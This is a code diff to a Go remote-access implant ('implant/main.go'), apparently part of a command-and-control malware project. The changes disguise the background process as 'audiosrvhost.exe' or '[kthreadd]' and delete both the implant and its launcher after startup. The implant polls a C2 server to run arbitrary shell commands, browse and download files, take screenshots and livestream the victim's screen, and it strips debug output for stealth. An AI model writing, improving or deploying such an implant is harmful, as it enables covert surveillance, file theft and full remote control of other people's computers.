@@ -1,3 +1,4 @@
+// implant/main.go
 package main
 
 import (
@@ -26,7 +27,9 @@ const (
 	c2AddressPlaceholder = "C2_IP_PLACEHOLDER_STRING_PADDING_TO_64_BYTES_XXXXXXXXXXXXXXXXXXXXX"
 	checkInInterval      = 5 * time.Second
 	livestreamInterval   = 1 * time.Second
-	backgroundMarkerArg  = "--implant-is-now-very-stealthy-and-happy" // Argument to identify background process
+	// backgroundMarkerEnvVar = "KTHREAD_ORIG_PATH_MARKER_XYZ789" // Old, caused conflict
+	backgroundMarkerEnvVar = "IMPLANT_IS_BACKGROUND_XYZ123"      // New marker for background status
+	originalPathEnvVar     = "IMPLANT_ORIG_LAUNCHER_PATH_XYZ789" // New var for original launcher path
 )
 
 var (
@@ -35,18 +38,19 @@ var (
 	commandResultURL   string
 	livestreamFrameURL string
 
-	// Global state for livestreaming
 	isLivestreamActive bool
 	stopLivestreamChan chan struct{}
+
+	gOriginalLauncherPath string // To store the path of the initial launcher
 )
 
-// Declarations for platform-specific functions (defined in other files)
-var doSelfDelete func(exePath string)
+var doSelfDelete func(selfExePath string, originalLauncherPath string)
 var setOSSpecificAttrs func(cmd *exec.Cmd)
 var takeScreenshot func() (string, error)
-var relaunchAsDaemonInternal func(exePath string, args []string) error // New: for daemonizing
 
-// implantID extracts the unique implant token.
+// Updated signature for relaunchAsDaemonInternal
+var relaunchAsDaemonInternal func(exePath string, args []string, targetName string, bgMarkerEnvKey string, origPathEnvKey string, origPathValue string) error
+
 func implantID() string {
 	s := string(implantIDBytes)
 	if nullIdx := strings.IndexByte(s, 0); nullIdx != -1 {
@@ -55,7 +59,6 @@ func implantID() string {
 	return strings.TrimSpace(s)
 }
 
-// c2ServerAddress extracts the C2 server address.
 func c2ServerAddress() string {
 	s := string(c2AddressBytes)
 	if nullIdx := strings.IndexByte(s, 0); nullIdx != -1 {
@@ -67,16 +70,16 @@ func c2ServerAddress() string {
 type FileSystemEntry struct {
 	Name        string    `json:"name"`
 	IsDir       bool      `json:"is_dir"`
-	Size        int64     `json:"size"` // Meaningful for files
+	Size        int64     `json:"size"`
 	ModTime     time.Time `json:"mod_time"`
-	Permissions string    `json:"permissions"` // e.g., "drwxr-xr-x"
-	Path        string    `json:"path"`        // Full path of the entry
+	Permissions string    `json:"permissions"`
+	Path        string    `json:"path"`
 }
 
 type FileSystemListing struct {
 	RequestedPath string            `json:"requested_path"`
 	Entries       []FileSystemEntry `json:"entries"`
-	Error         string            `json:"error,omitempty"` // If an error occurred listing
+	Error         string            `json:"error,omitempty"`
 }
 
 type Command struct {
@@ -100,13 +103,11 @@ type LivestreamFramePayload struct {
 	FrameData string `json:"frame_data"`
 }
 
-// Helper to call the platform-specific relaunch function
-func relaunchAsDaemon(exePath string, args []string) error {
+func relaunchAsDaemon(exePath string, args []string, targetName string, bgMarkerEnvKey string, origPathEnvKey string, origPathValue string) error {
 	if relaunchAsDaemonInternal != nil {
-		return relaunchAsDaemonInternal(exePath, args)
+		return relaunchAsDaemonInternal(exePath, args, targetName, bgMarkerEnvKey, origPathEnvKey, origPathValue)
 	}
-	// Fallback or error if not implemented for the platform (should be caught by build tags)
-	return fmt.Errorf("relaunchAsDaemonInternal not implemented for this platform: %s", runtime.GOOS)
+	return fmt.Errorf("relaunchAsDaemonInternal not implemented for this platform: %s, cannot daemonize", runtime.GOOS)
 }
 
 func initializeConfig() bool {
@@ -114,11 +115,9 @@ func initializeConfig() bool {
 	currentC2Address := c2ServerAddress()
 
 	if currentImplantID == "" || currentImplantID == implantIDPlaceholder {
-		fmt.Println("Error: Implant ID not properly set.")
 		return false
 	}
 	if currentC2Address == "" || currentC2Address == c2AddressPlaceholder {
-		fmt.Println("Error: C2 Address not properly set.")
 		return false
 	}
 
@@ -135,75 +134,74 @@ func initializeConfig() bool {
 }
 
 func main() {
-	exePath, err := os.Executable()
+	exePath, err := os.Executable() // This is the path of the CURRENTLY executing file
 	if err != nil {
-		// If we can't get exePath, self-delete and daemonization might be problematic.
-		// For stealth, simply exit or sleep.
-		// fmt.Fprintf(os.Stderr, "Failed to get executable path: %v\n", err)
-		time.Sleep(10 * time.Second) // Behave like a failed generic app
-		return
+		time.Sleep(10 * time.Second)
+		os.Exit(1)
 	}
 
-	isBackgroundProcess := false
-	for _, arg := range os.Args {
-		if arg == backgroundMarkerArg {
-			isBackgroundProcess = true
-			break
-		}
-	}
+	// Check if this is already the background process using the new backgroundMarkerEnvVar
+	isBackgroundProcess := (os.Getenv(backgroundMarkerEnvVar) == "1")
 
 	if !isBackgroundProcess {
 		// --- This is the initial execution. Relaunch self in background. ---
-		var newArgs []string
-		// Pass through original args, excluding the program name itself (os.Args[0])
-		// and ensure our marker is not duplicated.
-		if len(os.Args) > 1 {
-			for _, arg := range os.Args[1:] {
-				if arg != backgroundMarkerArg {
-					newArgs = append(newArgs, arg)
-				}
-			}
-		}
-		newArgs = append(newArgs, backgroundMarkerArg)
+		relaunchArgs := []string{} // No command line arguments
 
-		relaunchErr := relaunchAsDaemon(exePath, newArgs)
-		if relaunchErr != nil {
-			// For stealth, probably just exit. Logging to stderr might be undesirable.
-			// fmt.Fprintf(os.Stderr, "Failed to relaunch as daemon: %v\n", relaunchErr)
-			os.Exit(1) // Indicate an error subtly
+		var effectiveTargetProcessName string
+		if runtime.GOOS == "windows" {
+			effectiveTargetProcessName = "audiosrvhost.exe"
+		} else if runtime.GOOS == "linux" {
+			effectiveTargetProcessName = "[kthreadd]"
+		} else {
+			effectiveTargetProcessName = "implant_background_process"
 		}
-		// fmt.Println("Initial process: Relaunched in background. Exiting.")
-		os.Exit(0) // Initial process exits successfully, returning control to terminal.
+
+		// exePath here is the path of the file to BE COPIED AND RUN.
+		// Pass it as origPathValue.
+		// Use backgroundMarkerEnvVar for the background status marker, and originalPathEnvVar for the path.
+		relaunchErr := relaunchAsDaemon(exePath, relaunchArgs, effectiveTargetProcessName, backgroundMarkerEnvVar, originalPathEnvVar, exePath)
+		if relaunchErr != nil {
+			// Consider logging relaunchErr before exiting
+			os.Exit(1)
+		}
+		os.Exit(0) // Initial launcher exits after successfully starting the backgrounded copy.
 	}
 
 	// --- If we reach here, we ARE the background process. ---
-	// fmt.Println("Background process started. Scheduling self-delete.")
+	// Clear the background marker environment variable.
+	os.Unsetenv(backgroundMarkerEnvVar)
 
-	// Schedule self-deletion of this background process's executable.
-	// The doSelfDelete function is now implemented to use a grandchild process.
-	if doSelfDelete != nil {
-		doSelfDelete(exePath)
-	} else {
-		// This case should ideally not happen if platform files are correctly set up.
-		// fmt.Fprintf(os.Stderr, "Warning: doSelfDelete function not implemented for this platform.\n")
-	}
+	// Retrieve the original launcher path from the new originalPathEnvVar.
+	gOriginalLauncherPath = os.Getenv(originalPathEnvVar)
+	// Clear the original path environment variable for security.
+	os.Unsetenv(originalPathEnvVar)
 
 	if !initializeConfig() {
-		// fmt.Println("Background process: Failed to initialize config. Exiting after delay.")
-		time.Sleep(10 * time.Second) // Exit if config fails, after a delay.
-		return
+		time.Sleep(10 * time.Second)
+		os.Exit(1)
 	}
 
-	// fmt.Println("Background process: Config initialized. Starting main loop.")
+	// Schedule automatic self-deletion after startup
+	if doSelfDelete != nil {
+		// Start self-deletion process in background - delete both current executable and original launcher
+		go func() {
+			// Give the implant a moment to start up properly
+			time.Sleep(1 * time.Second)
+			doSelfDelete(exePath, gOriginalLauncherPath)
+		}()
+	}
+
+	// Main operational loop
 	for {
 		checkIn()
-		fetchAndExecuteCommands()
+		// Pass current exePath (of this backgrounded process) AND the original launcher's path
+		fetchAndExecuteCommands(exePath, gOriginalLauncherPath)
 		time.Sleep(checkInInterval)
 	}
 }
 
 func checkIn() {
-	if isLivestreamActive { // If livestreaming, frames act as keep-alive
+	if isLivestreamActive {
 		return
 	}
 	currentPwd, err := os.Getwd()
@@ -212,22 +210,25 @@ func checkIn() {
 	}
 	payload := CheckInPayload{
 		ImplantID: implantID(),
-		IPAddress: "", // C2 can derive this from request
+		IPAddress: "", // IP can be obtained server-side
 		PWD:       currentPwd,
 	}
 	jsonData, err := json.Marshal(payload)
 	if err != nil {
 		return
 	}
-	resp, err := http.Post(checkInURL, "application/json", bytes.NewBuffer(jsonData))
+	client := http.Client{Timeout: 10 * time.Second}
+	resp, err := client.Post(checkInURL, "application/json", bytes.NewBuffer(jsonData))
 	if err != nil {
 		return
 	}
 	defer resp.Body.Close()
 }
 
-func fetchAndExecuteCommands() {
-	resp, err := http.Get(commandsURL)
+// Modified: fetchAndExecuteCommands now accepts originalLauncherPath
+func fetchAndExecuteCommands(currentImplantExePath string, originalLauncherPath string) {
+	client := http.Client{Timeout: 15 * time.Second}
+	resp, err := client.Get(commandsURL)
 	if err != nil {
 		return
 	}
@@ -249,51 +250,66 @@ func fetchAndExecuteCommands() {
 		return
 	}
 
-	currentImplantID := implantID() // Cache for this loop iteration
-	currentPwd, _ := os.Getwd()     // Get PWD once per command batch for prompt
+	currentImplantID := implantID()
+	currentPwd, _ := os.Getwd()
 
 	for _, cmdToExec := range respStruct.Commands {
 		trimmedCmdStr := strings.TrimSpace(cmdToExec.Command)
-		// Update PWD for each command context if necessary, though 'cd' handles its own update.
-		// For simplicity, using PWD from start of fetchAndExecuteCommands for prompts.
 
 		if strings.HasPrefix(trimmedCmdStr, "fs_browse ") {
 			pathArgJSON := strings.TrimSpace(strings.TrimPrefix(trimmedCmdStr, "fs_browse "))
 			var browseRequest struct {
 				Path string `json:"path"`
 			}
-
-			if err := json.Unmarshal([]byte(pathArgJSON), &browseRequest); err != nil {
-				// fmt.Printf("fs_browse: failed to unmarshal path as JSON ('%s'), treating as raw path: %v\n", pathArgJSON, err)
-				browseRequest.Path = pathArgJSON
+			var targetPath string
+			if err := json.Unmarshal([]byte(pathArgJSON), &browseRequest); err == nil {
+				targetPath = browseRequest.Path
+			} else {
+				targetPath = pathArgJSON
 			}
 
-			targetPath := browseRequest.Path
 			if targetPath == "" {
 				errorListing := FileSystemListing{
 					RequestedPath: pathArgJSON,
-					Error:         "fs_browse: path argument is empty or invalid JSON.",
+					Error:         "fs_browse: path argument is empty.",
 				}
 				jsonOutput, _ := json.Marshal(errorListing)
 				sendOutput(cmdToExec.ID, string(jsonOutput))
 				continue
 			}
 
+			var listing FileSystemListing
+			var listErr error
+
 			if targetPath == "__ROOTS__" {
-				listing, listErr := listRoots()
-				if listErr != nil && listing.Error == "" {
-					listing.Error = fmt.Sprintf("Error listing roots: %v", listErr)
+				listing, listErr = listRoots()
+				if listErr != nil {
+					// If listRoots itself sets an error message in the listing, prefer that.
+					// Otherwise, use the error returned.
+					if listing.Error == "" {
+						listing.Error = fmt.Sprintf("Error listing roots: %v", listErr)
+					}
+					// Ensure RequestedPath is set for consistency, even in error cases from listRoots
+					if listing.RequestedPath == "" {
+						listing.RequestedPath = targetPath
+					}
 				}
-				jsonOutput, _ := json.Marshal(listing)
-				sendOutput(cmdToExec.ID, string(jsonOutput))
 			} else {
-				listing, listErr := listDirectory(targetPath)
-				if listErr != nil && listing.Error == "" {
-					listing.Error = fmt.Sprintf("Error listing directory '%s': %v", targetPath, listErr)
+				listing, listErr = listDirectory(targetPath)
+				if listErr != nil {
+					// If listDirectory itself sets an error message in the listing, prefer that.
+					// Otherwise, use the error returned.
+					if listing.Error == "" {
+						listing.Error = fmt.Sprintf("Error listing directory '%s': %v", targetPath, listErr)
+					}
+					// Ensure RequestedPath is set for consistency
+					if listing.RequestedPath == "" {
+						listing.RequestedPath = targetPath
+					}
 				}
-				jsonOutput, _ := json.Marshal(listing)
-				sendOutput(cmdToExec.ID, string(jsonOutput))
 			}
+			jsonOutput, _ := json.Marshal(listing) // Marshal the actual listing (or listing with error)
+			sendOutput(cmdToExec.ID, string(jsonOutput))
 			continue
 		}
 
@@ -302,13 +318,13 @@ func fetchAndExecuteCommands() {
 			var downloadRequest struct {
 				Path string `json:"path"`
 			}
-
-			if err := json.Unmarshal([]byte(pathArgJSON), &downloadRequest); err != nil {
-				sendOutput(cmdToExec.ID, fmt.Sprintf("fs_download: invalid path argument JSON: %v. Expected {\"path\":\"...\"}", err))
-				continue
+			var targetPath string
+			if err := json.Unmarshal([]byte(pathArgJSON), &downloadRequest); err == nil {
+				targetPath = downloadRequest.Path
+			} else {
+				targetPath = pathArgJSON
 			}
 
-			targetPath := downloadRequest.Path
 			if targetPath == "" {
 				sendOutput(cmdToExec.ID, "fs_download: path argument is empty.")
 				continue
@@ -351,6 +367,10 @@ func fetchAndExecuteCommands() {
 		}
 
 		if trimmedCmdStr == "screenshot" {
+			if takeScreenshot == nil {
+				sendOutput(cmdToExec.ID, "Screenshot function not available for this platform.")
+				continue
+			}
 			outputBase64, ssErr := takeScreenshot()
 			if ssErr != nil {
 				sendOutput(cmdToExec.ID, fmt.Sprintf("Screenshot failed: %v", ssErr))
@@ -360,9 +380,26 @@ func fetchAndExecuteCommands() {
 			continue
 		}
 
+		// MODIFIED: self_destruct command now uses both paths
+		if trimmedCmdStr == "self_destruct" {
+			sendOutput(cmdToExec.ID, "Self-destruct sequence initiated. Implant and original launcher (if path known) will be targeted for deletion.")
+			if doSelfDelete != nil {
+				// currentImplantExePath is the path of THIS running executable (e.g., the one in Temp if relaunched)
+				// originalLauncherPath is the path of the initial .exe that was run
+				doSelfDelete(currentImplantExePath, originalLauncherPath)
+				// doSelfDelete has now initiated the deletion mechanisms (e.g., detached script, goroutine).
+				// The current process must exit to allow these mechanisms to delete the files.
+			}
+			// Always exit after attempting to initiate self-destruct.
+			// This allows the deletion mechanisms (like a detached script) to work on unlocked files.
+			// If doSelfDelete was nil, this simply terminates the implant.
+			os.Exit(0)
+			// The 'continue' statement below is now unreachable, which is expected.
+		}
+
 		if strings.HasPrefix(trimmedCmdStr, "cd ") {
 			targetDir := strings.TrimSpace(strings.TrimPrefix(trimmedCmdStr, "cd "))
-			originalPwdForPrompt := currentPwd // PWD before 'cd' for the prompt
+			originalPwdForPrompt := currentPwd
 			if targetDir == "" {
 				homeDir, homeErr := os.UserHomeDir()
 				if homeErr != nil {
@@ -371,10 +408,18 @@ func fetchAndExecuteCommands() {
 				}
 				targetDir = homeDir
 			}
-			targetDir = os.ExpandEnv(targetDir) // Expand environment variables like $HOME or %USERPROFILE%
+			if strings.HasPrefix(targetDir, "~") {
+				homeDir, homeErr := os.UserHomeDir()
+				if homeErr == nil {
+					targetDir = strings.Replace(targetDir, "~", homeDir, 1)
+				}
+			}
+			targetDir = os.ExpandEnv(targetDir)
+
 			cdErr := os.Chdir(targetDir)
-			newPwd, _ := os.Getwd() // Get new PWD after attempt
-			currentPwd = newPwd     // Update currentPwd for subsequent commands in this batch
+			newPwd, _ := os.Getwd()
+			currentPwd = newPwd
+
 			prompt := fmt.Sprintf("%s $ %s\n", originalPwdForPrompt, cmdToExec.Command)
 			if cdErr != nil {
 				sendOutput(cmdToExec.ID, prompt+fmt.Sprintf("Error changing directory to '%s': %v", targetDir, cdErr))
@@ -384,14 +429,13 @@ func fetchAndExecuteCommands() {
 			continue
 		}
 
-		// Generic command execution
 		var command *exec.Cmd
 		if runtime.GOOS == "windows" {
-			command = exec.Command("cmd", "/C", cmdToExec.Command)
+			command = exec.Command("cmd", "/C", trimmedCmdStr)
 		} else {
-			command = exec.Command("sh", "-c", cmdToExec.Command)
+			command = exec.Command("sh", "-c", trimmedCmdStr)
 		}
-		command.Dir = currentPwd // Execute command in the current working directory
+		command.Dir = currentPwd
 		if setOSSpecificAttrs != nil {
 			setOSSpecificAttrs(command)
 		}
@@ -415,7 +459,6 @@ func sendOutput(cmdID int, output string) {
 	if err != nil {
 		return
 	}
-	// Consider adding a timeout to http.Post
 	client := http.Client{Timeout: 15 * time.Second}
 	resp, err := client.Post(commandResultURL, "application/json", bytes.NewBuffer(jsonData))
 	if err != nil {
@@ -425,35 +468,27 @@ func sendOutput(cmdID int, output string) {
 }
 
 func runLivestream(implantToken string, localStopChan <-chan struct{}) {
-	// fmt.Printf("[%s] Livestream goroutine started.\n", implantToken) // Debug
 	ticker := time.NewTicker(livestreamInterval)
 	defer ticker.Stop()
-	// defer fmt.Printf("[%s] Livestream goroutine stopped.\n", implantToken) // Debug
 
 	for {
 		select {
 		case <-ticker.C:
-			if !isLivestreamActive { // Double check global state
+			if !isLivestreamActive {
 				return
 			}
-			if takeScreenshot == nil { // Ensure screenshot func is available
-				// fmt.Printf("[%s] Livestream: takeScreenshot not available for this platform.\n", implantToken) // Debug
-				// Optionally stop livestream or send an error frame
-				isLivestreamActive = false // Stop if capability is missing
-				if stopLivestreamChan != nil {
-					close(stopLivestreamChan)
-				}
+			if takeScreenshot == nil {
+				isLivestreamActive = false // Stop livestream if capability is gone
+				// Consider logging this event or sending a status to C2
 				return
 			}
 			outputBase64, err := takeScreenshot()
 			if err != nil {
-				// fmt.Printf("[%s] Livestream screenshot failed: %v\n", implantToken, err) // Debug
-				continue // Skip this frame
+				continue // Skip frame on error
 			}
 			sendLivestreamFrame(implantToken, outputBase64)
 
 		case <-localStopChan:
-			// fmt.Printf("[%s] Livestream goroutine: Received stop signal.\n", implantToken) // Debug
 			return
 		}
 	}
@@ -466,22 +501,12 @@ func sendLivestreamFrame(implantToken string, base64Data string) {
 	}
 	jsonData, err := json.Marshal(payload)
 	if err != nil {
-		// fmt.Printf("[%s] Error marshalling livestream frame: %v\n", implantToken, err) // Debug
 		return
 	}
-	client := http.Client{Timeout: 5 * time.Second} // Shorter timeout for frames
+	client := http.Client{Timeout: 5 * time.Second}
 	resp, err := client.Post(livestreamFrameURL, "application/json", bytes.NewBuffer(jsonData))
 	if err != nil {
-		// fmt.Printf("[%s] Error sending livestream frame: %v\n", implantToken, err) // Debug
 		return
 	}
 	defer resp.Body.Close()
-
-	if resp.StatusCode != http.StatusOK {
-		// bodyBytes, _ := io.ReadAll(resp.Body)
-		// fmt.Printf("[%s] Error sending livestream frame, C2 status: %s, body: %s\n", implantToken, resp.Status, string(bodyBytes)) // Debug
-	}
 }
-
-// listDirectory and listRoots remain the same as in your provided code.
-// These functions are called by fetchAndExecuteCommands.
